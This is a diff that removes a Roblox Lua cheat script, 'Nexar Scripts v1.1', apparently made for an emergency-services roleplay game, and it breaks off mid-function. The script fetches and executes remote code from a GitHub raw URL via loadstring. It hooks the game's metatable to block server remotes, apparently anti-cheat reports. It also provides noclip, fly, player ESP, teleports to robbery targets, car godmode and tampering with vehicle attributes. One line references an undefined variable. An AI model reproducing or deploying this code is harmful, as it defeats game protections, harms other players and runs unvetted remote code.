@@ -1,2028 +1,1881 @@
-print("Script injecting with bypasser")
-wait(2.5)
-print("Successfully Injected Nexar script")
-wait(1.2)
-print("Have Fun using the Best script Made By Love -unnezy x3")
-wait(0.1)
-print("This Script currently only works on a level 8 executor dont use executors like: Xeno,Solara ! instead use Velocity,Volcano,Bunni.lol")
--- // Orion Library
-local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/MrOhio67/Scripts/refs/heads/main/TTest.lua'))()
-
-local Window = OrionLib:MakeWindow({
-    Name = "Nexar Scripts v1.1",
-    HidePremium = false,
-    SaveConfig = false,
-    ConfigFolder = "EmptyTabs"
-})
-
--- Tabs
-local AimbotTab = Window:MakeTab({ Name = "Aimbot", Icon = "rbxassetid://3926305904" })
-local TrollTab = Window:MakeTab({ Name = "Troll", Icon = "rbxassetid://3926305904" })
-local ServerInfoTab = Window:MakeTab({ Name = "Server Info", Icon = "rbxassetid://3926305904" })
-local MiscTab = Window:MakeTab({ Name = "Misc", Icon = "rbxassetid://3926305904" }) -- FIXED: MicsTab → MiscTab
-local TeleportsTab = Window:MakeTab({ Name = "Teleport", Icon = "rbxassetid://3926305904"})
-local CarModsTab = Window:MakeTab({ Name = "Car mods", Icon = "rbxassetid://3926305904"})
-OrionLib:Init()
-
-OrionLib:MakeNotification({
-    Name = "Executed!",
-    Content = "Made by -unnezy | discord: @unnezy",
-    Image = "rbxassetid://4483345998",
-    Time = 5
-})
-
--- Services
-local RS = game:GetService("ReplicatedStorage")
-local P = game:GetService("Players")
-local W = game:GetService("Workspace")
-local R = game:GetService("RunService")
-local UIS = game:GetService("UserInputService")
-local SG = game:GetService("StarterGui")
-local LP = P.LocalPlayer
-
--- Anti-Remote Block
-local mt = getrawmetatable(game)
-local nc = mt.__namecall
-setreadonly(mt, false)
-
-local block = {
-    RS:WaitForChild("8WX"):WaitForChild("c5e56a9e-c828-4d2a-a755-7086cca2a88d"),
-    RS:WaitForChild("8WX"):WaitForChild("c2499a7d-2993-4c90-aa4d-df3bc5e06930"),
-    RS:WaitForChild("8WX"):WaitForChild("86437dfc-c1d3-4a4c-90cb-041fa4d6a802"),
-    RS:WaitForChild("8WX"):WaitForChild("d43e2acd-d917-48e2-8265-2a5917e3800e")
-}
-
-mt.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    if method == "FireServer" or method == "InvokeServer" then
-        for _, remote in ipairs(block) do
-            if self == remote then return end
-        end
-    end
-    return nc(self, ...)
-end)
-setreadonly(mt, true)
-
---------------------------------------------------------------------
--- // NOCLIP SYSTEM (FIXED)
---------------------------------------------------------------------
-local noclipActive = false
-local noclipConnection = nil
-
-local function updateNoclip()
-    local char = LP.Character
-    if not char then return end
-    for _, part in ipairs(char:GetDescendants()) do
-        if part:IsA("BasePart") then
-            part.CanCollide = not noclipActive
-        end
-    end
-end
-
-MiscTab:AddToggle({
-    Name = "Toggle NoClip",
-    Default = false,
-    Callback = function(value)
-        noclipActive = value
-        if noclipActive then
-            if noclipConnection then noclipConnection:Disconnect() end
-            noclipConnection = R.Stepped:Connect(updateNoclip)
-            updateNoclip()
-        else
-            if noclipConnection then
-                noclipConnection:Disconnect()
-                noclipConnection = nil
-            end
-            updateNoclip()
-        end
-    end
-})
-
--- Respawn support
-LP.CharacterAdded:Connect(function()
-    task.wait(0.1)
-    if noclipActive then updateNoclip() end
-end)
-
---------------------------------------------------------------------
--- // FLY SYSTEM (IMPROVED)
---------------------------------------------------------------------
-local flyEnabled = false
-local flySpeed = 0.5
-local flyKey = Enum.KeyCode.V
-local flyToggleInstance = nil
-
--- Fly Toggle
-flyToggleInstance = MiscTab:AddToggle({
-    Name = "Fly",
-    Default = false,
-    Callback = function(v)
-        flyEnabled = v
-        if not v and LP.Character then
-            local hum = LP.Character:FindFirstChildOfClass("Humanoid")
-            local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
-            if hum then hum.PlatformStand = false end
-            if hrp then hrp.Velocity = Vector3.zero end
-        end
-    end
-})
-
--- Fly Speed Slider
-MiscTab:AddSlider({
-    Name = "Fly Speed",
-    Min = 1,
-    Max = 10,
-    Default = 2,
-    Increment = 1,
-    ValueName = "x",
-    Callback = function(val)
-        flySpeed = val
-    end
-})
-
--- Fly Keybind
-MiscTab:AddBind({
-    Name = "Fly Toggle Key",
-    Default = Enum.KeyCode.V,
-    Hold = false,
-    Callback = function(key)
-        flyKey = key
-    end
-})
-
--- Notification
-local function notify(title, text)
-    pcall(function()
-        SG:SetCore("SendNotification", { Title = title, Text = text, Duration = 2 })
-    end)
-end
-
--- Toggle with key
-UIS.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-    if input.KeyCode == flyKey then
-        flyEnabled = not flyEnabled
-        if flyToggleInstance then flyToggleInstance:Set(flyEnabled) end
-        notify("Fly", flyEnabled and "ON" or "OFF")
-        if not flyEnabled and LP.Character then
-            local hum = LP.Character:FindFirstChildOfClass("Humanoid")
-            local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
-            if hum then hum.PlatformStand = false end
-            if hrp then hrp.Velocity = Vector3.zero end
-        end
-    end
-end)
-
--- Fly Loop
-R.RenderStepped:Connect(function()
-    if not flyEnabled then return end
-
-    local char = LP.Character
-    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
-
-    local hrp = char.HumanoidRootPart
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if hum then hum.PlatformStand = true end
-
-    local cam = workspace.CurrentCamera
-    local moveDir = Vector3.new()
-
-    if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir += cam.CFrame.LookVector end
-    if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir -= cam.CFrame.LookVector end
-    if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir -= cam.CFrame.RightVector end
-    if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir += cam.CFrame.RightVector end
-    if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir += Vector3.new(0,1,0) end
-    if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir -= Vector3.new(0,1,0) end
-
-    -- Face forward
-    hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + cam.CFrame.LookVector)
-
-    -- Move
-    hrp.Velocity = Vector3.zero
-    if moveDir.Magnitude > 0 then
-        hrp.CFrame += moveDir.Unit * flySpeed
-    end
-end)
-
--- Respawn fly fix
-LP.CharacterAdded:Connect(function()
-    task.wait(0.5)
-    if flyEnabled and LP.Character then
-        local hum = LP.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.PlatformStand = true end
-    end
-end)
-
-
-
--------ESP ANFANG   
-
-
-local VisualTab = Window:MakeTab({
-    Name = "Esp",
-    Icon = "rbxassetid://3926305904",
-    PremiumOnly = false
-})
-
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-
-local ESPEnabled = false
-local ESPSettings = {
-    ShowName = false,
-    ShowUsername = false,
-    ShowDistance = false,
-    ShowTeam = false,
-    ESPColor = Color3.fromRGB(150,150,150), -- Gris
-    TextSize = 20,
-    MaxDistance = 100
-}
-
-
-local function getESPText(plr)
-    local text = ""
-    local char = plr.Character
-    if not char or not char:FindFirstChild("HumanoidRootPart") then return "" end
-    if ESPSettings.ShowName then text = text .. plr.DisplayName .. " " end
-    if ESPSettings.ShowUsername then text = text .. "(" .. plr.Name .. ") " end
-    if ESPSettings.ShowDistance then
-        local dist = (LocalPlayer.Character.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
-        text = text .. "["..math.floor(dist).."m] "
-    end
-    if ESPSettings.ShowTeam and plr.Team and plr.Team.Name then
-        text = text .. "["..plr.Team.Name.."] "
-    end
-    return text
-end
-
-
-local function getBillboard(head)
-    local bb = head:FindFirstChild("ESP_BB")
-    if not bb then
-        bb = Instance.new("BillboardGui")
-        bb.Name = "ESP_BB"
-        bb.Size = UDim2.new(0, 200, 0, ESPSettings.TextSize)
-        bb.AlwaysOnTop = true
-        bb.StudsOffset = Vector3.new(0, 2, 0)
-        bb.Parent = head
-
-        local textLabel = Instance.new("TextLabel")
-        textLabel.Name = "ESP_Text"
-        textLabel.Size = UDim2.new(1, 0, 1, 0)
-        textLabel.BackgroundTransparency = 1
-        textLabel.TextStrokeTransparency = 0.6
-        textLabel.TextScaled = true
-        textLabel.Font = Enum.Font.SourceSansBold
-        textLabel.TextYAlignment = Enum.TextYAlignment.Top
-        textLabel.Parent = bb
-    end
-    return bb
-end
-
-
-local function adjustOffset(plr, index)
-    local char = plr.Character
-    if char and char:FindFirstChild("Head") then
-        local bb = getBillboard(char.Head)
-        bb.StudsOffset = Vector3.new(0, 2 + index * 0.5, 0)
-    end
-end
-
-
-RunService.RenderStepped:Connect(function()
-    if not ESPEnabled then
-        for _, plr in pairs(Players:GetPlayers()) do
-            if plr.Character and plr.Character:FindFirstChild("Head") then
-                local bb = plr.Character.Head:FindFirstChild("ESP_BB")
-                if bb then bb:Destroy() end
-            end
-        end
-        return
-    end
-
-    local indexCounter = {}
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") then
-            local head = plr.Character.Head
-            local dist = (LocalPlayer.Character.HumanoidRootPart.Position - head.Position).Magnitude
-            if dist <= ESPSettings.MaxDistance then
-                local bb = getBillboard(head)
-                local label = bb.ESP_Text
-                label.Text = getESPText(plr)
-                label.TextColor3 = ESPSettings.ESPColor
-                label.TextSize = ESPSettings.TextSize
-
-               
-                local key = math.floor(head.Position.X*10).."_"..math.floor(head.Position.Z*10)
-                indexCounter[key] = (indexCounter[key] or 0) + 1
-                adjustOffset(plr, indexCounter[key])
-            else
-                local bb = head:FindFirstChild("ESP_BB")
-                if bb then bb:Destroy() end
-            end
-        end
-    end
-end)
-
-
-VisualTab:AddToggle({ Name = "Enable ESP", Default = false, Callback = function(v) ESPEnabled = v end })
-VisualTab:AddToggle({ Name = "Show Nametag", Default = false, Callback = function(v) ESPSettings.ShowName = v end })
-VisualTab:AddToggle({ Name = "Show Username", Default = false, Callback = function(v) ESPSettings.ShowUsername = v end })
-VisualTab:AddToggle({ Name = "Show Distance", Default = false, Callback = function(v) ESPSettings.ShowDistance = v end })
-VisualTab:AddToggle({ Name = "Show Team", Default = false, Callback = function(v) ESPSettings.ShowTeam = v end })
-
-
-VisualTab:AddSlider({
-    Name = "ESP Text Size",
-    Min = 10,
-    Max = 40,
-    Default = ESPSettings.TextSize,
-    Callback = function(v) ESPSettings.TextSize = v end
-})
-
-
-VisualTab:AddSlider({
-    Name = "Max ESP Distance",
-    Min = 10,
-    Max = 1000,
-    Default = ESPSettings.MaxDistance,
-    Callback = function(v) ESPSettings.MaxDistance = v end
-})
-
-
-
-
-
-
---server info anfang 
-
-
-local totalLabel = ServerInfoTab:AddLabel("Total Players: 0")
-local policeLabel = ServerInfoTab:AddLabel("Police: 0")
-local fireLabel = ServerInfoTab:AddLabel("Firedepartements: 0")
-local adacLabel = ServerInfoTab:AddLabel("ADAC: 0")
-local busLabel = ServerInfoTab:AddLabel("Bus Company: 0")
-local truckLabel = ServerInfoTab:AddLabel("Truck Company: 0")
-local citizenLabel = ServerInfoTab:AddLabel("Citizen: 0")
-local youLabel = ServerInfoTab:AddLabel("You: N/A")
-
-
-local function updateInfo()
-    local players = game.Players:GetPlayers()
-    local total = #players
-    local police, fire, adac, bus, truck, citizen = 0,0,0,0,0,0
-
-    for _,plr in pairs(players) do
-        if plr.Team then
-            local lname = plr.Team.Name:lower()
-            if lname:find("police") then
-                police += 1
-            elseif lname:find("fire") then
-                fire += 1
-            elseif lname:find("adac") then
-                adac += 1
-            elseif lname:find("bus") then
-                bus += 1
-            elseif lname:find("truck") then
-                truck += 1
-            else
-                citizen += 1
-            end
-        else
-            citizen += 1
-        end
-    end
-
-    totalLabel:Set("Total Players: " .. total)
-    policeLabel:Set("Police: " .. police)
-    fireLabel:Set("Firedepartements: " .. fire)
-    adacLabel:Set("ADAC: " .. adac)
-    busLabel:Set("Bus Company: " .. bus)
-    truckLabel:Set("Truck Company: " .. truck)
-    citizenLabel:Set("Citizen: " .. citizen)
-
-    local me = game.Players.LocalPlayer
-    if me.Team then
-        youLabel:Set("You: " .. me.Name .. " (" .. me.Team.Name .. ")")
-    else
-        youLabel:Set("You: " .. me.Name .. " (No Team)")
-    end
-end
-
-
-task.spawn(function()
-    while task.wait(2) do
-        updateInfo()
-    end
-end)
-
-updateInfo()
-
-
-
-
-
---teleport 
-
-
- local function moveCarToTarget(destination)
-        local Players = game:GetService("Players")
-        local TweenService = game:GetService("TweenService")
-        local LocalPlayer = Players.LocalPlayer
-        local VehiclesFolder = workspace:WaitForChild("Vehicles")
-
-        local car = VehiclesFolder:FindFirstChild(LocalPlayer.Name)
-        if not car then
-            warn("No car found")
-            return
-        end
-
-        local driveSeat = car:FindFirstChild("DriveSeat", true)
-        if not driveSeat then
-            warn("No DriveSeat found")
-            return
-        end
-
-        car.PrimaryPart = driveSeat
-        driveSeat:Sit(LocalPlayer.Character:WaitForChild("Humanoid"))
-
-        local function moveTo(target)
-            local dist = (car.PrimaryPart.Position - target).Magnitude
-            local time = dist / 175
-            local info = TweenInfo.new(time, Enum.EasingStyle.Linear)
-            local cfVal = Instance.new("CFrameValue")
-            cfVal.Value = car:GetPivot()
-
-            cfVal.Changed:Connect(function(cf)
-                car:PivotTo(cf)
-                driveSeat.AssemblyLinearVelocity = Vector3.zero
-                driveSeat.AssemblyAngularVelocity = Vector3.zero
-            end)
-
-            local tween = TweenService:Create(cfVal, info, { Value = CFrame.new(target) })
-            tween:Play()
-            tween.Completed:Wait()
-            cfVal:Destroy()
-        end
-
-        local start = car.PrimaryPart.Position
-        moveTo(start + Vector3.new(0, -5, 0))
-        moveTo(destination + Vector3.new(0, -5, 0))
-        moveTo(destination)
-    end
-
-
-    TeleportsTab:AddButton({
-        Name = "Teleport to Nearest Dealer",
-        Callback = function()
-            local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
-            local dealers = workspace:FindFirstChild("Dealers")
-            if not dealers then return end
-
-            local closest, shortest = nil, math.huge
-            for _, dealer in pairs(dealers:GetChildren()) do
-                if dealer:FindFirstChild("Head") then
-                    local dist = (character.HumanoidRootPart.Position - dealer.Head.Position).Magnitude
-                    if dist < shortest then
-                        shortest = dist
-                        closest = dealer.Head
-                    end
-                end
-            end
-            if closest then
-                moveCarToTarget(closest.Position + Vector3.new(0, 5, 0))
-            end
-        end
-    })
-
-    
-    TeleportsTab:AddButton({
-        Name = "Teleport to Robbable Vending Machine",
-        Callback = function()
-            local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
-            local machines = workspace:FindFirstChild("Robberies") and workspace.Robberies:FindFirstChild("VendingMachines")
-            if not machines then return end
-
-            local closest, shortest = nil, math.huge
-            for _, model in pairs(machines:GetChildren()) do
-                for _, part in pairs(model:GetChildren()) do
-                    if part:IsA("Part") and part.Color == Color3.fromRGB(73, 147, 0) then
-                        local dist = (character.HumanoidRootPart.Position - part.Position).Magnitude
-                        if dist < shortest then
-                            shortest = dist
-                            closest = part
-                        end
-                    end
-                end
-            end
-
-            if closest then
-                moveCarToTarget(closest.Position)
-            else
-                OrionLib:MakeNotification({
-                    Name = "Not Found",
-                    Content = "Robbable Vending Machine not found!",
-                    Image = "rbxassetid://4483345998",
-                    Time = 5
-                })
-            end
-        end
-    })
-    
-   
-    TeleportsTab:AddButton({ Name = "Teleport to Bank", Callback = function() moveCarToTarget(Vector3.new(-1166.91, 5.86, 3190.407)) end })
- 
-    TeleportsTab:AddButton({ Name = "Teleport to Jewel Store", Callback = function() moveCarToTarget(Vector3.new(-427.862, 49.628, 3500.895)) end })
-
-    TeleportsTab:AddButton({ Name = "Teleport to Club", Callback = function() moveCarToTarget(Vector3.new(-1865.73, 5.63, 3015.14)) end })
-  
-    TeleportsTab:AddButton({ Name = "Teleport to Farm Shop", Callback = function() moveCarToTarget(Vector3.new(-904.34, 5.35, -1167.26)) end })
-  
-    TeleportsTab:AddButton({ Name = "Teleport to Gas-N-Go", Callback = function() moveCarToTarget(Vector3.new(-1543.59, 5.82, 3799.58)) end })
-
-    TeleportsTab:AddButton({ Name = "Teleport to Ares Gas Station", Callback = function() moveCarToTarget(Vector3.new(-865.29, 5.61, 1509.46)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport to Osso", Callback = function() moveCarToTarget(Vector3.new(-35.25, 5.71, -761.23)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport to Green Container", Callback = function() moveCarToTarget(Vector3.new(1164.07, 29.16, 2152.81)) end })
- 
-    TeleportsTab:AddButton({ Name = "Teleport to Golden Container", Callback = function() moveCarToTarget(Vector3.new(1125.94, 29.16, 2331.82)) end })
-   
-    TeleportsTab:AddButton({ Name = "Teleport to ADAC", Callback = function() moveCarToTarget(Vector3.new(-152.12, 5.52, 452.47)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport to Tuning", Callback = function() moveCarToTarget(Vector3.new(-1372.408, 5.656, 170.811)) end })
-   
-    TeleportsTab:AddButton({ Name = "Teleport to Hospital", Callback = function() moveCarToTarget(Vector3.new(-288.187, 5.787, 1121.457)) end })
- 
-    TeleportsTab:AddButton({ Name = "Teleport to Police Station", Callback = function() moveCarToTarget(Vector3.new(-1674.341, 5.807, 2746.140)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport to Fire Department", Callback = function() moveCarToTarget(Vector3.new(-1674.341, 5.807, 2746.140)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport to Car Dealer", Callback = function() moveCarToTarget(Vector3.new(-1390.604, 5.615, 941.208)) end })
-   
-    TeleportsTab:AddButton({ Name = "Teleport to Car Bus Company", Callback = function() moveCarToTarget(Vector3.new(-1680.241, 5.618, -1278.784)) end })
- 
-    TeleportsTab:AddButton({ Name = "Teleport to Clothing Store", Callback = function() moveCarToTarget(Vector3.new(-1680.241, 5.618, -1278.784)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport to Prison", Callback = function() moveCarToTarget(Vector3.new(-566.475, 5.810, 2851.558)) end })
-    
-    TeleportsTab:AddButton({ Name = "Teleport inside Prison", Callback = function() moveCarToTarget(Vector3.new(-606.739, 5.490, 3049.082)) end })
-
-    TeleportsTab:AddLabel("Notes:You can get kick ")
-
-
-
-
-
-
-    --carmods Anfang
-
-
-    
-local PlayerSection = CarModsTab:AddSection({
-    Name = "Carfly"
-})
-
-local flightEnabled = false
-local flightSpeed = 1
-local flightGui
-local guiFlightDirection = Vector3.new(0, 0, 0)
-local buttonDirections = {
-    W = Vector3.new(0, 0, -1),
-    A = Vector3.new(-1, 0, 0),
-    S = Vector3.new(0, 0, 1),
-    D = Vector3.new(1, 0, 0),
-}
-
-local function createFlightGui()
-    local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
-    screenGui.Name = "FlightControlGui"
-    screenGui.Enabled = false
-
-    local frame = Instance.new("Frame", screenGui)
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.Position = UDim2.new(0.5, 0, 0.8, 0)
-    frame.Size = UDim2.new(0, 200, 0, 200)
-    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    frame.BackgroundTransparency = 0.2
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0.1, 0)
-    Instance.new("UIDragDetector", frame)
-
-    local buttonSize = UDim2.new(0, 60, 0, 60)
-    local positions = {
-        W = UDim2.new(0.5, -30, 0, 0),
-        A = UDim2.new(0, 0, 0.5, -30),
-        S = UDim2.new(0.5, -30, 1, -60),
-        D = UDim2.new(1, -60, 0.5, -30),
-    }
-    local rotations = {W = 0, A = -90, S = 180, D = 90}
-
-    for key, direction in pairs(buttonDirections) do
-        local button = Instance.new("ImageButton", frame)
-        button.Name = key.."Button"
-        button.Position = positions[key]
-        button.Size = buttonSize
-        button.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-        button.BackgroundTransparency = 0.1
-        button.Image = "rbxassetid://11432834725"
-        button.Rotation = rotations[key]
-        Instance.new("UICorner", button).CornerRadius = UDim.new(0.1, 0)
-
-        button.MouseButton1Down:Connect(function()
-            guiFlightDirection = guiFlightDirection + direction
-        end)
-        button.MouseButton1Up:Connect(function()
-            guiFlightDirection = Vector3.zero
-        end)
-    end
-    return screenGui
-end
-
-local function toggleFlightGui(Value)
-    if not flightGui then
-        flightGui = createFlightGui()
-    end
-    guiFlightDirection = Vector3.zero
-    flightGui.Enabled = Value
-end
-
-local UIS = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local LP = game.Players.LocalPlayer
-
-RunService.RenderStepped:Connect(function()
-    if flightEnabled then
-        local char = LP.Character
-        if char and char:FindFirstChild("Humanoid") and char.Humanoid.Sit then
-            local seat = char.Humanoid.SeatPart
-            if seat and seat.Name == "DriveSeat" then
-                local vehicle = seat.Parent
-                if vehicle then
-                    if not vehicle.PrimaryPart then
-                        vehicle.PrimaryPart = seat
-                    end
-                    local camLook = workspace.CurrentCamera.CFrame.LookVector
-                    vehicle:PivotTo(CFrame.new(vehicle.PrimaryPart.Position, vehicle.PrimaryPart.Position + camLook) *
-                        CFrame.new(
-                            ((UIS:IsKeyDown(Enum.KeyCode.D) and flightSpeed or 0) - (UIS:IsKeyDown(Enum.KeyCode.A) and flightSpeed or 0)) + guiFlightDirection.X * flightSpeed,
-                            ((UIS:IsKeyDown(Enum.KeyCode.E) and flightSpeed/2 or 0) - (UIS:IsKeyDown(Enum.KeyCode.Q) and flightSpeed/2 or 0)) + guiFlightDirection.Y * flightSpeed,
-                            ((UIS:IsKeyDown(Enum.KeyCode.S) and flightSpeed or 0) - (UIS:IsKeyDown(Enum.KeyCode.W) and flightSpeed or 0)) + guiFlightDirection.Z * flightSpeed
-                        ))
-                    seat.AssemblyLinearVelocity = Vector3.zero
-                    seat.AssemblyAngularVelocity = Vector3.zero
-                end
-            end
-        end
-    end
-end)
-
-local flyToggle = CarModsTab:AddToggle({
-    Name = "Car Fly",
-    Default = false,
-    Callback = function(Value)
-        flightEnabled = Value
-    end
-})
-
-CarModsTab:AddToggle({
-    Name = "Mobile Fly Menu",
-    Default = false,
-    Callback = function(Value)
-        toggleFlightGui(Value)
-    end
-})
-
-CarModsTab:AddSlider({
-    Name = "Car Fly Speed",
-    Min = 10,
-    Max = 190,
-    Default = 60,
-    Increment = 10,
-    ValueName = "Speed",
-    Callback = function(Value)
-        flightSpeed = Value / 50
-    end
-})
-
-CarModsTab:AddBind({
-    Name = "Car Fly Keybind",
-    Default = Enum.KeyCode.X,
-    Hold = false,
-    Callback = function()
-        flightEnabled = not flightEnabled
-        flyToggle:Set(flightEnabled)
-    end
-})
-
-
-
---SPINBOT
-
--- // SPINBOT (NUR DAS!)
-local spinbotEnabled = false
-local spinbotSpeed = 50
-local spinConnection
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local StarterGui = game:GetService("StarterGui")
-local LocalPlayer = Players.LocalPlayer
-
-OrionLib:Init()
-
--- Spinbot Toggle
-MiscTab:AddToggle({
-    Name = "Spinbot",
-    Default = false,
-    Callback = function(v)
-        spinbotEnabled = v
-        if v then
-            spinConnection = RunService.Heartbeat:Connect(function()
-                local char = LocalPlayer.Character
-                if char and char:FindFirstChild("HumanoidRootPart") then
-                    local hrp = char.HumanoidRootPart
-                    local spinRad = math.rad(spinbotSpeed / 30) -- RPM zu Radians
-                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, spinRad, 0)
-                end
-            end)
-        else
-            if spinConnection then
-                spinConnection:Disconnect()
-                spinConnection = nil
-            end
-        end
-    end
-})
-
--- Speed Slider (1-500 RPM)
-MiscTab:AddSlider({
-    Name = "Spin Speed",
-    Min = 1,
-    Max = 500,
-    Default = 50,
-    Increment = 1,
-    ValueName = "RPM",
-    Callback = function(val)
-        spinbotSpeed = val
-    end
-})
-
--- Notification
-StarterGui:SetCore("SendNotification", {
-    Title = "SPINBOT LOADED!",
-    Text = "Troll Tab → 1-500 RPM",
-    Duration = 4
-})
-
-
-
---Car speed multiplaier
-
-
-local player = game:GetService("Players").LocalPlayer
-local RunService = game:GetService("RunService")
-local vehicleGodMode = false
-local lastVehicle = nil
-
-local function updateVehicle()
-    if not vehicleGodMode then return end
-    if not lastVehicle or not lastVehicle.Parent then
-        local vehiclesFolder = workspace:FindFirstChild("Vehicles")
-        lastVehicle = vehiclesFolder and vehiclesFolder:FindFirstChild(player.Name) or nil
-    end
-    if lastVehicle then
-        lastvehicle:SetAttribute("IsOn", true)
-        lastVehicle:SetAttribute("currentHealth", 999999999999)
-        lastVehicle:SetAttribute("currentFuel", math.huge)
-    end
-end
-
-CarModsTab:AddButton({
-    Name = "Car Godmode",
-    Default = false,
-    Callback = function(value)
-        vehicleGodMode = value
-        if not vehicleGodMode then
-            lastVehicle = nil
-        end
-    end
-})
-
-RunService.Heartbeat:Connect(updateVehicle)
-
-
-CarModsTab:AddSlider({
-    Name = "Engine Armor Brakes",
-    Min = 0,
-    Max = 6,
-    Default = 0,
-    Color = Color3.fromRGB(255, 215, 0),
-    Increment = 1,
-    ValueName = "Level",
-    Callback = function(value)
-        local player = game:GetService("Players").LocalPlayer
-        local vehicleFolder = workspace:WaitForChild("Vehicles")
-        local playerVehicle = vehicleFolder:FindFirstChild(player.Name)
-        if playerVehicle then
-            playerVehicle:SetAttribute("armorLevel", value)
-            playerVehicle:SetAttribute("brakesLevel", value)
-            playerVehicle:SetAttribute("engineLevel", value)
-        end
-    end
-})
-
-
-
-local VehiclesFolder = workspace:WaitForChild("Vehicles")
-local LocalPlayer = game.Players.LocalPlayer
-
-
-local SuspensionBase = {}
-
-
-local function setSuspensionHeight(offset)
-    local vehicle = VehiclesFolder:FindFirstChild(LocalPlayer.Name)
-    if not vehicle then return end
-
-    -- Applique la vraie suspension (SpringConstraint)
-    for _, part in ipairs(vehicle:GetDescendants()) do
-        if part:IsA("SpringConstraint") then
-            if not SuspensionBase[part] then
-                SuspensionBase[part] = {
-                    FreeLength = part.FreeLength,
-                    Stiffness = part.Stiffness,
-                    Damping = part.Damping
-                }
-            end
-
-            local base = SuspensionBase[part]
-            part.FreeLength = math.max(base.FreeLength + offset, 0.5)
-            part.Stiffness = base.Stiffness * (1 + offset/10) -- évite que ça s’écrase
-            part.Damping = base.Damping * (1 + offset/15) -- garde stabilité
-        end
-    end
-
-
-    if vehicle.PrimaryPart then
-        vehicle:SetPrimaryPartCFrame(vehicle.PrimaryPart.CFrame * CFrame.new(0, offset * 0.05, 0))
-    end
-end
-
-
-CarModsTab:AddSlider({
-    Name = "Suspension Height (Bug)",
-    Min = 1,
-    Max = 4,
-    Default = 0,
-    Color = Color3.fromRGB(255, 215, 0),
-    Increment = 0.5,
-    ValueName = "Offset",
-    Callback = function(value)
-        setSuspensionHeight(value)
-    end
-})
-
-
-
-local carBoostPower = 250
-CarModsTab:AddSlider({
-    Name = "Car Boost Power",
-    Min = 100,
-    Max = 500,
-    Default = carBoostPower,
-    Color = Color3.fromRGB(255, 215, 0),
-    Increment = 10,
-    ValueName = "Studs/sec",
-    Callback = function(value)
-        carBoostPower = value
-    end
-})
-
-CarModsTab:AddButton({
-    Name = "Car Boost",
-    Callback = function()
-        local player = game.Players.LocalPlayer
-        local vehiclesFolder = workspace:FindFirstChild("Vehicles")
-        if not vehiclesFolder then return end
-        local vehicle = vehiclesFolder:FindFirstChild(player.Name)
-        if not vehicle then return end
-        local seat = vehicle:FindFirstChild("DriveSeat") or vehicle:FindFirstChildWhichIsA("VehicleSeat")
-        if not seat then return end
-        local primaryPart = vehicle.PrimaryPart or seat
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:WaitForChild("Humanoid")
-        if humanoid.SeatPart ~= seat then return end
-        primaryPart.AssemblyLinearVelocity = seat.CFrame.LookVector * carBoostPower
-    end
-})
-
-
-local carJumpPower = 90
-CarModsTab:AddSlider({
-    Name = "Car Jump Height",
-    Min = 80,
-    Max = 500,
-    Default = carJumpPower,
-    Color = Color3.fromRGB(255, 215, 0),
-    Increment = 1,
-    ValueName = "Studs",
-    Callback = function(value)
-        carJumpPower = value
-    end
-})
-
-CarModsTab:AddButton({
-    Name = "Car Jump",
-    Callback = function()
-        local player = game.Players.LocalPlayer
-        local vehiclesFolder = workspace:FindFirstChild("Vehicles")
-        if not vehiclesFolder then return end
-        local vehicle = vehiclesFolder:FindFirstChild(player.Name)
-        if not vehicle then return end
-        local seat = vehicle:FindFirstChild("DriveSeat") or vehicle:FindFirstChildWhichIsA("VehicleSeat")
-        if not seat then return end
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:WaitForChild("Humanoid")
-        if humanoid.SeatPart ~= seat then return end
-        seat.AssemblyLinearVelocity = seat.AssemblyLinearVelocity + Vector3.new(0, carJumpPower, 0)
-    end
-})
-
-
-local player = game.Players.LocalPlayer
-local RunService = game:GetService("RunService")
-local UIS = game:GetService("UserInputService")
-local VehiclesFolder = workspace:FindFirstChild("Vehicles")
-
-
-local accelMultiplier = 1      
-local accelEnabled = false     
-local originalAttrs = {}       
-local lastVehicleRef = nil     
-
-
-CarModsTab:AddSlider({
-    Name = "Acceleration Multiplier",
-    Min = 1,
-    Max = 3, 
-    Default = 1,
-    Color = Color3.fromRGB(255, 215, 0),
-    Increment = 0.1,
-    ValueName = "x",
-    Callback = function(value)
-        accelMultiplier = value
-    end
-})
-
-
-CarModsTab:AddToggle({
-    Name = "Enable Accel Multiplier",
-    Default = false,
-    Callback = function(v)
-        accelEnabled = v
-        -- si on désactive, restore du véhicule précédemment modifié
-        if not accelEnabled and lastVehicleRef then
-            pcall(function()
